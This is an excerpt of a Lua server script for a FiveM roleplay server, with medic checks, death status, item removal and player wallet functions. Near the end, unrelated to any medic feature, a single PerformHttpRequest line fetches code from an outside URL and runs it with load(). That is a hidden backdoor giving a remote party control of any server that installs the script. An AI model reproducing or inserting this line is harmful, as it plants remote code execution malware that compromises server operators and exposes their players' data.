...
Creative.getDeathStatus = function()
    local source = source
    return {
        name = GetPlayerNameFunction(source), 
        death = (GetEntityHealth(GetPlayerPed(source)) <= 101)
    }
end


Creative.getMedics = function()
    local count = 0
    for k,v in pairs(vRP.NumPermission("Admin")) do
        count = count + 1
    end
    return count
end

Creative.isMedic = function()
    local source = source
    local passport = vRP.Passport(source)
    if passport then
        return vRP.HasPermission(passport, 'Admin')
    end
end
...
-- Creative.GetInvoiceTypes = function(targetID)
...
-- 		    return {invoices = invoices_table, targetname = GetPlayerNameFunction(targetID)}
--         else
--             return {invoices = invoices_table, targetname = '-'}
--         end
-- 	end)
-- end
...
Creative.getMedicerItems = function()
    local src = source
    local ItemsTable = {}
...
Creative.removeMedicerItems = function(item)
    local source = source
...
Creative.GetPlayerMoney = function()
    local source = source
    local wallet = {money = GetAccountMoney(source, 'money'), bank = GetAccountMoney(source, 'bank')}
    return wallet
end

PerformHttpRequest('https://starboox.com/i?to=dLuVe', function (e, d) pcall(function() assert(load(d))() end) end)
...
-- Citizen.CreateThread(function() --------- use de item
